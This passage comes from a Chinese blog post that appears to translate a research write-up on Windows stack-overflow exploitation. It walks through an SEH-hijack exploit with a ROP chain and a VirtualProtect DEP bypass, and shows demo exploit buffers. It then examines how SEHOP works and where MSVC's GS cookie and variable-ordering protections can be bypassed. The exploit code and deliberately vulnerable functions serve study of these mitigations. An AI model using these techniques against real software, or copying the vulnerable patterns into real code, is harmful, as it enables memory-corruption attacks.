class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;... loaded non-ASLR/non-SafeSEH module msvbvm60.dll to 0x%p\r\n&quot;</span>), hModule);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;... passing %d bytes of data to vulnerable function\r\n&quot;</span>), <span class="built_in">sizeof</span>(Exploit) - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Overflow</span>(Exploit, <span class="number">0x20000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码中有几个细节值得注意。首先，您可能注意到，我通过将垃圾异常处理程序（0xdeadc0de）链接到TEB(FS[0])中的处理程序列表，显式注册了该处理程序。之所以这样做，是因为我发现在栈顶部覆盖NTDLL.DLL注册的默认处理程序的做法不太可靠。这是因为有时栈的顶端没有足够的空间来容纳shellcode，这会触发VirtualProtect的STATUS_CONFICTING_ADDRESS错误（代码0xc0000015）。</p><p>图20中另一个值得注意的细节是，我在ROP链末端的溢出内容中加入了自己的shellcode。这是我编写的一个自定义的shellcode（源代码可以从Github上下载），它在ROP链化后的栈上被执行后会弹出一个消息框。</p><p>编译完含有溢出漏洞程序后，我们可以进行单步跟踪，看看溢出数据是如何结合在一起来执行shellcode的。</p><p>(上面那段代码的内联汇编语法有错误，不知道是他写的有问题还是我的设置问题，报错信息为C2400“操作码”中的内联汇编语法错误；找到“[”，所以下面都是别人的图)</p><p>在漏洞程序发生栈溢出之前的状态</p><p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/Picture28.png" alt="img"></p><p>在第一个断点处，我们可以看到，栈上的目标EXCEPTION_REGISTRATION_RECORD位于0x00B9ABC8处。在发生溢出之后，我们可以期待该handler字段将被我们伪造的SEH handler的地址所覆盖。</p><p><img src="/.io//Picture29-1707050428583.png" alt="img"></p><p>memcpy对栈末端之外执行写入操作是抛出的访问违例异常（Access violation exception）</p><p><img src="/.io//Picture29-1707050428583.png" alt="img"></p><p>在memcpy函数中，由于rep MOVSB指令试图将数据写入栈的末端之外的内存时，发生了访问违例异常。在0x00B9ABCC处，我们可以看到EXCEPTION_REGISTRATION_RECORD结构体的handler字段已经被我们msvbvm60.dll中的栈pivot gadget的地址所覆盖。</p><p>伪造的SEH handler让ESP跳回由溢出控制的地区</p><p><img src="/.io//Picture30-1707050428583.png" alt="img"></p><p>在栈中向上跳过0x1004字节，我们可以看到在突出显示区域，ESP现在指向我们ROP链的开始地址。这个ROP链将填充所有相关寄存器的值，以便为PUSHAD gadget做好相应的准备，之后，该gadget将把这些值移到栈上，从而为调用KERNEL32.DLL!VirtualProtect做好准备。</p><p> PUSHAD为绕过DEP准备好相应的调用栈</p><p><img src="/.io//Picture31-1707050428583.png" alt="img"></p><p>在PUSHAD指令执行后，我们可以看到ESP现在指向msvbvm60.dll中的ROPN，其后紧跟KERNEL32.DLL中VirtualProtect的地址。在0x00B9B594处，我们可以看到传递给VirtualProtect的第一个参数，就是我们栈上0x00B9B5A4处的shellcode的地址（该地址在上图中已经突出显示）。</p><p>ROP链的最后一个gadget将EIP设置为ESP</p><p><img src="/.io//Picture32-1707050428583.png" alt="img"></p><p>一旦VirtualProtect返回，ROP链中的最后一个gadget就会将EIP重定向到ESP的值，这样，ESP将指向我们直接存储在ROP链之后的shellcode的起始位置。您可能已经注意到，shellcode的前4个字节实际上就是ROP链通过PUSHAD指令动态生成的NOP指令，而不是通过溢出写入的shellcode的起始位置。</p><p>弹出消息框的shellcode在栈上成功执行，从而完成了漏洞的利用过程</p><p><img src="/.io//Picture33-1707050428584.png" alt="img"></p><h2 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h2><p>实际上，在Windows中还有一种更为强大的SEH劫持缓解机制，称为SEH覆写保护（SEH Overwrite Protection，SEHOP），它可以抗衡这里描述的方法。引入SEHOP的目的，是为了既可以检测EXCEPTION_REGISTRATION_RECORD损坏，又无需重新编译应用程序或依靠每个模块的漏洞利用缓解方案，如SafeSEH。为此，SEHOP将在SEH链的底部引入一个额外的链接，并在异常发生时通过检查是否可以通过遍历SEH链而到达该链接，来实现SEH劫持的防御机制。由于EXCEPTION_REGISTRATION_RECORD的NSEH字段存储在handler字段之前，因此，在通过栈溢出破坏现有的SEH handler时，必然会破坏NSEH，以及破坏整个链（原理上类似于栈金丝雀（stack canary），其中金丝雀就是NSEH字段本身）。SEHOP是在Windows Vista SP1（在默认情况下禁用）和Windows Server 2008（在默认情况下启用）中引入的，在过去的十年中，SEHOP一直处于这种半启用状态（在工作站上禁用，在服务器上启用）。值得注意的是，最近随着Windows 10 v1709的发布，这种情况已经发生了变化：SEHOP已经成为默认启用的漏洞缓解功能了。</p><p><img src="/.io//image-20230529162453538-1707050428584.png" alt="image-20230529162453538"></p><p>这似乎与上一节在Windows 10虚拟机上探讨的SEH劫持溢出情况相矛盾。为什么SEHOP没有能够在exploit的初始阶段阻止EIP重定向到栈pivot？虽然我们还不是十分清楚，然而这似乎是微软方面配置错误的问题。当我对之前探索溢出所用EXE程序单独进行设置，并手动点选“Override system settings”框后，SEHOP机制就开始发挥威力：栈pivot将无法执行。令人费解的是，在默认情况下，系统已经在该进程上启用了SEHOP机制。</p><p>下图为某exe文件，没有手动勾选。</p><p><img src="/.io//image-20230529162751462-1707050428584.png" alt="image-20230529162751462"></p><p>这有可能是微软方面有意的配置，只是在上面的截图中被曲解了。由于SEHOP与第三方应用程序（如Skype和Cygwin）不兼容，因此，SEHOP在历史上一直被广泛禁用（微软在这里讨论了这个问题）。当SEHOP与本文中讨论的其他漏洞缓解措施一起正确启用时，在没有链式内存泄漏（任意读取）或任意写入原语的情况下，SEH劫持将无法用于利用栈溢出漏洞。任意读取原语可以允许NSEH字段在溢出前被泄漏，这样就可以制作溢出数据，以便在EIP劫持期间不破坏SEH链。通过任意写入原语（在下一节讨论），攻击者可以覆盖存储在栈上的返回地址或SEH handler，而不会破坏NSEH或栈金丝雀的值，从而绕过SEHOP和栈Cookie缓解措施。</p><h2 id="任意写入-amp-局部变量破坏"><a href="#任意写入-amp-局部变量破坏" class="headerlink" title="任意写入&amp;局部变量破坏"></a>任意写入&amp;局部变量破坏</h2><p>在某些情况下，攻击者根本就不需要溢出函数栈帧的末尾来触发EIP重定向。如果他们可以在不需要覆盖栈Cookie的情况下成功地获得代码执行权限，那么栈Cookie验证检查就可以轻松绕过。为此，有一种方法是使用栈溢出来破坏函数中的局部变量，以便让应用程序将我们选择的值写入我们选择的地址。下面的示例函数包含可以用这种方式利用的逻辑。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint32_t</span> gdwGlobalVar = <span class="number">0</span>; </span><br><span class="line">  <span class="type">void</span> Overflow（<span class="type">uint8_t</span>* pInputBuf， <span class="type">uint32_t</span> dwInputBufSize) &#123; </span><br><span class="line">    <span class="type">char</span> Buf[<span class="number">16</span>]; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1 = <span class="number">1</span>; </span><br><span class="line">    <span class="type">uint32_t</span>* pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line">    memcpy（Buf， pInputBuf， dwInputBufSize); </span><br><span class="line">    *pdwVar2 = dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>从根本上讲，我们要利用的是一个非常简单的代码模式：</p><ol><li>函数必须包含一个容易发生栈溢出的数组或结构。</li><li>该函数必须包含至少两个局部变量：一个解引用的指针和一个用于写入该指针的值。</li><li>函数必须使用局部变量写入解引用的指针，并在栈溢出发生后执行这个操作。</li><li>函数必须以这样的方式进行编译：即溢出的数组在栈上存储的位置比局部变量低。</li></ol><p>最后一点是一个值得进一步研究的问题。我们希望MSVC（Visual Studio 2019使用的编译器）以这样的方式编译图29中的代码：Buf的16个字节被放在分配给栈帧内存的最低区域（当包含栈Cookie时，应该是总共28个字节），然后是最高区域的dwVar1和pdwVar2。这个顺序与源代码中声明这些变量的顺序是一致的；这允许Buf向前溢出到更高的内存中，并用我们选择的值覆盖dwVar1和pdwVar2的值，从而使我们用于覆盖dwVar1的值被放在我们选择的内存地址上。然而在现实中，情况并非如此，编译器给出的汇编代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">push ebp </span><br><span class="line">mov ebp,esp </span><br><span class="line">sub esp,1C </span><br><span class="line">mov eax,dword ptr ds:[&lt;___security_cookie&gt;] </span><br><span class="line">xor eax,ebp </span><br><span class="line">mov dword ptr ss:[ebp-4],eax </span><br><span class="line">mov dword ptr ss:[ebp-1C],1 </span><br><span class="line">mov dword ptr ss:[ebp-18], </span><br><span class="line">mov ecx,dword ptr ss:[ebp+C] </span><br><span class="line">push ecx </span><br><span class="line">mov edx,dword ptr ss:[ebp+8] </span><br><span class="line">push edx </span><br><span class="line">lea eax,dword ptr ss:[ebp-14] </span><br><span class="line">push eax </span><br><span class="line">call  </span><br><span class="line">add esp,C </span><br><span class="line">mov ecx,dword ptr ss:[ebp-18] </span><br><span class="line">mov edx,dword ptr ss:[ebp-1C] </span><br><span class="line">mov dword ptr ds:[ecx],edx </span><br><span class="line">mov ecx,dword ptr ss:[ebp-4] </span><br><span class="line">xor ecx,ebp </span><br><span class="line">call &lt;preciseoverwrite.@__security_check_cookie@4&gt; </span><br><span class="line">mov esp,ebp </span><br><span class="line">pop ebp </span><br><span class="line">ret </span><br></pre></td></tr></table></figure><p>从上面的反汇编代码中我们可以看到，编译器已经在EBP-0x4和EBP-0x14之间的最高内存部分中选择了一个对应于Buf的区域，并且已经在EBP-0x1C和EBP-0x18的最低内存部分中分别为dwVar1和pdwVar2选择了一个区域。这种排序使易受攻击的函数免受局部变量通过栈溢出而损坏的影响。也许最有趣的是，dwVar1和pdwVar2的排序与它们在源代码中相对于Buf的声明顺序相矛盾。这最初让我觉得很不解，因为我认为MSVC会根据变量的声明顺序来排序，但进一步的测试证明事实并非如此。实际上，进一步的测试证明，MSVC并不是根据变量的声明、类型或名称的顺序来排序，而是根据它们在源代码中被引用（使用）次数来排序：引用次数多的变量将优先于那些引用次数少的变量。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Test</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="type">uint32_t</span> A; </span><br><span class="line">    <span class="type">uint32_t</span> B; </span><br><span class="line">    <span class="type">uint32_t</span> C; </span><br><span class="line">    <span class="type">uint32_t</span> D; </span><br><span class="line"> </span><br><span class="line">    B = <span class="number">2</span>; </span><br><span class="line">    A = <span class="number">1</span>; </span><br><span class="line">    D = <span class="number">4</span>; </span><br><span class="line">    C = <span class="number">3</span>; </span><br><span class="line">    C++; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>因此，我们可以预期这个函数的编译会按以下方式排列变量：C、B、A、D。这符合变量引用(使用)次数的顺序，而不是它们被声明的顺序。其中，C将被放在第一位(内存中最高地址处，距离EBP的偏移量最小)，因为它被引用了两次，而其他变量都只被引用了一次。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">push ebp </span><br><span class="line">mov ebp,esp </span><br><span class="line">sub esp,10 </span><br><span class="line">mov dword ptr ss:[ebp-8],2 </span><br><span class="line">mov dword ptr ss:[ebp-C],1 </span><br><span class="line">mov dword ptr ss:[ebp-10],4 </span><br><span class="line">mov dword ptr ss:[ebp-4],3 </span><br><span class="line">mov eax,dword ptr ss:[ebp-4] </span><br><span class="line">add eax,1 </span><br><span class="line">mov dword ptr ss:[ebp-4],eax </span><br><span class="line">mov esp,ebp </span><br><span class="line">pop ebp </span><br><span class="line">ret </span><br></pre></td></tr></table></figure><p>果然，我们可以看到，变量都已经按照我们预测的顺序排列，其中，C位于EBP – 4处，也就是排在第一位。尽管如此，MSVC使用的排序逻辑与我们在图30中看到的情况相矛盾。毕竟，dwVar1和pdwVar2的引用次数（各两次）都比Buf高（在memcpy中只有一次），而且都是在Buf之前引用的。那么这是怎么回事呢？GS包含了一个额外的安全缓解功能，它试图安全地对局部变量进行排序，以防止由于栈溢出而导致可利用的局部变量破坏。</p><p> 在GS机制下生成的具有安全变量顺序栈布局</p><p><img src="/.io//t01efae18697f164d60-1707050428584.png" alt="img"></p><p>绕过在项目设置中禁用GS，会产生以下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">push ebp </span><br><span class="line">mov ebp,esp </span><br><span class="line">sub esp,18 </span><br><span class="line">mov dword ptr ss:[ebp-8],1 </span><br><span class="line">mov dword ptr ss:[ebp-4], </span><br><span class="line">mov eax,dword ptr ss:[ebp+C] </span><br><span class="line">push eax </span><br><span class="line">mov ecx,dword ptr ss:[ebp+8] </span><br><span class="line">push ecx </span><br><span class="line">lea edx,dword ptr ss:[ebp-18] </span><br><span class="line">push edx </span><br><span class="line">call  </span><br><span class="line">add esp,C </span><br><span class="line">mov eax,dword ptr ss:[ebp-4] </span><br><span class="line">mov ecx,dword ptr ss:[ebp-8] </span><br><span class="line">mov dword ptr ds:[eax],ecx </span><br><span class="line">mov esp,ebp </span><br><span class="line">pop ebp </span><br><span class="line">ret </span><br></pre></td></tr></table></figure><p>仔细对比上图34中的汇编代码和图30中的原始（安全）汇编代码，大家就会发现，从这个函数中删除的可不仅仅是栈Cookie检查。事实上，MSVC已经完全重新排列了栈上的变量，使其与正常规则一致，因此将Buf数组放在了内存的最低区域（EBP – 0x18）。因此，这个函数现在很容易通过栈溢出导致局部变量损坏。</p><p>在用多种不同的变量类型（包括其他数组类型）测试了同样的逻辑后，我得出如下结论：MSVC对数组和结构体（GS缓冲区）有一个特殊的规则，即总是将它们放在内存的最高区域，以防止编译后的函数的局部变量因栈溢出而遭到破坏。了解到这些信息后，我开始尝试评估这个安全机制的复杂程度，并设法通过边缘案例（edge cases）来绕过它。我发现了多个，下面是我认为最显著的例子。</p><p>首先，让我们来看看如果memcpy被移除会发生什么情况。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Overflow</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="type">uint8_t</span> Buf[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1 = <span class="number">1</span>; </span><br><span class="line">    <span class="type">uint32_t</span>* pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line"> </span><br><span class="line">    *pdwVar2 = dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>我们希望MSVC的安全排序规则总是将数组放置在内存的最高区域，以为函数提供安全保护，然而汇编代码表明，事情并非如此。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">push ebp </span><br><span class="line">mov ebp,esp </span><br><span class="line">sub esp,18 </span><br><span class="line">xor eax,eax </span><br><span class="line">mov dword ptr ss:[ebp-18],eax </span><br><span class="line">mov dword ptr ss:[ebp-14],eax </span><br><span class="line">mov dword ptr ss:[ebp-10],eax </span><br><span class="line">mov dword ptr ss:[ebp-C],eax </span><br><span class="line">mov dword ptr ss:[ebp-8],1 </span><br><span class="line">mov dword ptr ss:[ebp-4], </span><br><span class="line">mov ecx,dword ptr ss:[ebp-4] </span><br><span class="line">mov edx,dword ptr ss:[ebp-8] </span><br><span class="line">mov dword ptr ds:[ecx],edx </span><br><span class="line">mov esp,ebp </span><br><span class="line">pop ebp </span><br><span class="line">ret </span><br></pre></td></tr></table></figure><p>如您所见，MSVC已经从函数中删除了栈Cookie。同时，MSVC还将Buf数组放在了内存的最低区域，这违背了其典型的安全策略；如果缓冲区未被引用，它将不考虑GS缓冲区的安全重排序规则。这样就提出了一个有趣的问题：何谓引用？令人惊讶的是，答案并不像我们所期望的那样（引用就是函数中对变量的任何使用）。针对某些类型的变量使用并不能算作引用，因此不会影响变量的排序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Test</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="type">uint8_t</span> Buf[<span class="number">16</span>]&#125;; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1 = <span class="number">1</span>; </span><br><span class="line">    <span class="type">uint32_t</span>* pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line"> </span><br><span class="line">    Buf[<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>; </span><br><span class="line">    Buf[<span class="number">1</span>] = <span class="string">&#x27;B&#x27;</span>; </span><br><span class="line">    Buf[<span class="number">2</span>] = <span class="string">&#x27;C&#x27;</span>; </span><br><span class="line">    *pdwVar2 = dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>在上面的例子中，我们希望Buf被放置在内存的第一个（最高）槽（slot）中，因为它被引用了三次，而dwVar1和pdwVar2各只被引用了两次。这个函数的汇编代码与此相矛盾。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">push ebp </span><br><span class="line">mov ebp,esp </span><br><span class="line">sub esp,18 </span><br><span class="line">mov dword ptr ss:[ebp-8],1 </span><br><span class="line">mov dword ptr ss:[ebp-4], </span><br><span class="line">mov eax,1 </span><br><span class="line">imul ecx,eax,0 </span><br><span class="line">mov byte ptr ss:[ebp+ecx-18],41 </span><br><span class="line">mov edx,1 </span><br><span class="line">shl edx,0 </span><br><span class="line">mov byte ptr ss:[ebp+edx-18],42 </span><br><span class="line">mov eax,1 </span><br><span class="line">shl eax,1 </span><br><span class="line">mov byte ptr ss:[ebp+eax-18],43 </span><br><span class="line">mov ecx,dword ptr ss:[ebp-4] </span><br><span class="line">mov edx,dword ptr ss:[ebp-8] </span><br><span class="line">mov dword ptr ds:[ecx],edx </span><br><span class="line">mov esp,ebp </span><br><span class="line">pop ebp </span><br><span class="line">ret </span><br></pre></td></tr></table></figure><p>尽管Buf是一个数组，而且比其他任何一个局部变量使用得更多，但是，它却被保存在栈内存的最低处EBP–0x18。上面的汇编代码的另一个有趣的细节是，MSVC没有给上面的函数添加安全Cookie检查。这就意味着，该返回地址仍会受到经典栈溢出以及任意写入漏洞的影响。</p><p>越界写入漏洞</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">uint8_t</span> Exploit[] = </span><br><span class="line">    <span class="string">&quot;AAAAAAAAAAAAAAAA&quot;</span>  <span class="comment">// 16 bytes for buffer length </span></span><br><span class="line">    <span class="string">&quot;\xde\xc0\xad\xde&quot;</span>  <span class="comment">// New EIP 0xdeadc0de </span></span><br><span class="line">    <span class="string">&quot;\x1c\xff\x19\x00&quot;</span>; <span class="comment">// 0x0019FF1c </span></span><br><span class="line"> </span><br><span class="line"><span class="type">uint32_t</span> gdwGlobalVar = <span class="number">0</span>; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OverflowOOBW</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123; </span><br><span class="line">    <span class="type">uint8_t</span> Buf[<span class="number">16</span>]; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1 = <span class="number">1</span>; </span><br><span class="line">    <span class="type">uint32_t</span>* pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">uint32_t</span> dwX = <span class="number">0</span>; dwX &lt; dwInputBufSize; dwX++) &#123; </span><br><span class="line">    Buf[dwX] = pInputBuf[dwX]; </span><br><span class="line">    &#125; </span><br><span class="line"> </span><br><span class="line">    *pdwVar2 = dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>编译并执行上面的代码会导致一个没有栈Cookies和没有进行安全的变量排序的函数，这样的话，攻击者就可以通过精确覆盖0x0019FF1c处的返回地址来劫持EIP（在本例中，我已经禁用了ASLR）。</p><p><img src="/.io//../../../../OneDrive%20-%20office/OneDrive/%E6%96%87%E6%A1%A3%20%E7%AC%94%E8%AE%B0/%E6%A0%88%E6%BA%A2%E5%87%BA/Picture47.png" alt="img"></p><p>根据这些实验，我们可以得出如下所示的结论：</p><ol><li>MSVC中存在一个安全漏洞：错误地评估了一个函数对栈溢出攻击的潜在敏感性。</li><li>这个安全漏洞源于MSVC使用某种形式的内部引用次数来决定变量顺序，而当一个变量的引用次数为零时，它被排除在常规的安全排序和栈Cookie安全缓解措施之外（即使它是一个GS缓冲区）。</li><li>按索引读&#x2F;写数组不计入引用次数。因此，以这种方式访问数组的函数将缺乏针对栈溢出漏洞的保护。</li></ol><p>对于可能无法适当防止栈溢出的代码模式，我还有几个其他的想法，首先是结构体&#x2F;类的概念。虽然函数栈帧内的变量排序没有标准化或约定俗成（完全由编译器决定），但对于结构体来说，情况就不一样了；编译器必须精确地遵循源代码中声明变量的顺序。因此，如果一个结构体中包含一个数组，后面还有额外的变量，这些变量就无法安全地重新排序，因此，可能会因溢出而被破坏。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">MyStruct</span> &#123; </span><br><span class="line">    <span class="type">char</span> Buf[<span class="number">16</span>]; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1; </span><br><span class="line">    <span class="type">uint32_t</span> *pdwVar2; </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OverflowStruct</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123; </span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">MyStruct</span> TestStruct = &#123; <span class="number">0</span> &#125;; </span><br><span class="line">    TestStruct.dwVar1 = <span class="number">1</span>; </span><br><span class="line">    TestStruct.pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line">    <span class="built_in">memcpy</span>(TestStruct.Buf, pInputBuf, dwInputBufSize); </span><br><span class="line">    *TestStruct.pdwVar2 = TestStruct.dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>上面用于结构体的概念同样也适用于C++类，前提是它们被声明为局部变量并在栈上分配内存空间。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyClass</span> &#123; </span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line">    <span class="type">char</span> Buf[<span class="number">16</span>]; </span><br><span class="line">    <span class="type">uint32_t</span> dwVar1; </span><br><span class="line">    <span class="type">uint32_t</span>* pdwVar2; </span><br><span class="line">&#125;; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">OverflowClass</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123; </span><br><span class="line">    MyClass TestClass; </span><br><span class="line">    TestClass.dwVar1 = <span class="number">1</span>; </span><br><span class="line">    TestClass.pdwVar2 = &amp;gdwGlobalVar; </span><br><span class="line">    <span class="built_in">memcpy</span>(TestClass.Buf, pInputBuf, dwInputBufSize); </span><br><span class="line">    *TestClass.pdwVar2 = TestClass.dwVar1; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>当涉及到类时，一个额外的攻击手法是破坏其vtable指针。这些vtable包含指向可执行代码的其他指针，这些可执行代码可以在RET指令之前通过被破坏的类的方法进行调用，从而提供了一种通过破坏局部变量来劫持EIP的新方法，而无需使用任意写入原语。</p><p>最后一个容易被局部变量破坏的代码模式的例子是使用运行时栈分配函数，如_alloca。由于这类函数的内存分配过程，是在函数的栈帧已经建立后，通过减去ESP来实现的，因此，这类函数分配的内存将始终处于较低的栈内存中，所以无法重新排序或免受此类攻击的威胁。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">OverflowAlloca</span><span class="params">(<span class="type">uint8_t</span>* pInputBuf, <span class="type">uint32_t</span> dwInputBufSize)</span> </span>&#123; </span><br><span class="line">    <span class="type">uint32_t</span> dwValue = <span class="number">1</span>; </span><br><span class="line">    <span class="type">uint32_t</span>* pgdwGlobalVar = &amp;gdwGlobalVar; </span><br><span class="line">    <span class="type">char</span>* Buf = (<span class="type">char</span>*)_alloca(<span class="number">16</span>); </span><br><span class="line">    <span class="built_in">memcpy</span>(Buf, pInputBuf, dwInputBufSize); </span><br><span class="line">    *pgdwGlobalVar = dwValue; </span><br><span class="line">&#125; 